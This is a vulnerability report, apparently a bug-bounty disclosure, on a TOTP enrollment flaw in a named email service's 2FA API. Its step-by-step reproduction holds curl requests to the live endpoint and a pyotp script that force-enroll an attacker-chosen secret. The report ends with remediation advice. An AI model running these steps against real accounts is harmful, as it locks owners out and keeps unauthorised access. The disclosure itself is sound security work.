# [Medium] 2FA Enable API Validates TOTP Against Attacker-Controlled Secret, Enabling Forced TOTP Enrollment on Unprotected Accounts

---

## 1. Summary

The `POST /api/settings/two_factor_auth/?action=verify_app_2fa` endpoint, when used to **enable** TOTP (i.e., when `auth_to_disable=""` in the request body), validates the submitted TOTP code against the `totp_secret_key` value sent by the **client** rather than a server-stored secret. This means an attacker with a valid session but no existing TOTP can enroll TOTP on the account using an attacker-chosen secret. Once enrolled, only codes from the attacker's authenticator app are accepted, locking the legitimate account owner out of their own TOTP 2FA.

---

## 2. Vulnerability Details

- **Class**: Business Logic — Client-Controlled Security Parameter (WSTG-BUSL-09)
- **Endpoint**: `POST https://app-us.smtp2go.com/api/settings/two_factor_auth/?action=verify_app_2fa&CSRF_key=<key>`
- **Root cause**: In enable mode, the server constructs the TOTP validator using `totp_secret_key` from the POST body rather than a server-side generated and stored secret. The server generates a `proposed_secret` on every `verify_auth` call, but `verify_app_2fa` ignores it and uses whatever secret the client sends.

---

## 3. Severity

- **Rating**: Medium
- **CVSS v3.1**: 5.4 — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L
- **Justification**: Requires authenticated access (low privilege). Impact: attacker can permanently lock the victim out of their own TOTP 2FA by enrolling an attacker-controlled secret. Availability and integrity of the 2FA mechanism are compromised.

---

## 4. Steps to Reproduce

**Prerequisites:**
- Authenticated session on a target account that has **no existing TOTP** enabled
- Valid `CSRF_key` obtained from `/account/2fa/` page

**Step 1 — Call verify_auth to get a proposed secret (any value, we will override it):**
```bash
curl -s -b cookies.txt \
  "https://app-us.smtp2go.com/api/settings/two_factor_auth/?action=verify_auth&CSRF_key=CSRF_KEY_HERE" \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"password":"ACCOUNT_PASSWORD"}'
# Response: {"totp_secret_key": "PROPOSED_SECRET", ...}
```

**Step 2 — Generate attacker's own TOTP secret:**
```python
import pyotp
attacker_secret = pyotp.random_base32()  # e.g. "JBSWY3DPEHPK3PXP"
totp = pyotp.TOTP(attacker_secret)
current_code = totp.now()
print(f"Secret: {attacker_secret}, Code: {current_code}")
```

**Step 3 — Submit verify_app_2fa with attacker-controlled secret:**
```bash
curl -s -b cookies.txt \
  "https://app-us.smtp2go.com/api/settings/two_factor_auth/?action=verify_app_2fa&CSRF_key=CSRF_KEY_HERE" \
  -X POST \
  -H 'Content-Type: application/json' \
  -d "{\"totp_secret_key\":\"JBSWY3DPEHPK3PXP\",\"auth_to_disable\":\"\",\"otp_code\":\"$current_code\"}"
# Response: {"status": "ok", ...} — TOTP enabled with attacker's secret
```

**Step 4 — Verify enrollment:**
The account now requires TOTP at login, but only the **attacker's** authenticator app generates valid codes. The legitimate account owner cannot generate correct codes because they were never shown the attacker-controlled secret.

**Confirmed in testing against a test account with TOTP disabled.** The `verify_app_2fa` endpoint accepted a TOTP code validated against the client-provided `totp_secret_key`, successfully enabling TOTP.

**Limitation (per testing):** If the account already has TOTP enabled, the server returns `{"error": "Authentication already exists"}`. This prevents replacing an existing TOTP secret using this method.

---

## 5. Impact

- **Account lockout**: An attacker with session access can enable TOTP with their own secret, preventing the legitimate owner from logging in (they cannot generate the correct TOTP code)
- **Privilege retention**: If an attacker momentarily gains session access (e.g., via XSS, session fixation, or CSRF), they can use this to maintain persistent access by forcing TOTP enrollment — even after the session expires, the account is effectively locked unless the owner contacts support
- **Applicable accounts**: Any authenticated account without existing TOTP — including accounts where the owner has not yet set up 2FA

---

## 6. Recommended Remediation

1. **Server-side secret binding**: On `verify_auth` call, generate the TOTP secret server-side and store it in the session. On `verify_app_2fa`, validate the submitted OTP code against the **session-stored** secret — never against the client-provided `totp_secret_key`
2. **Remove `totp_secret_key` from request body**: The secret should not be transmitted from client to server during verification; it should flow server → client (for QR display) and the client only returns the OTP code
3. **Re-authentication gate**: Require password re-entry (already implemented via `verify_auth`) before any TOTP enrollment or modification, and ensure the re-auth token is strongly bound to the server-generated secret

---

*Tested on: 2026-05-08*
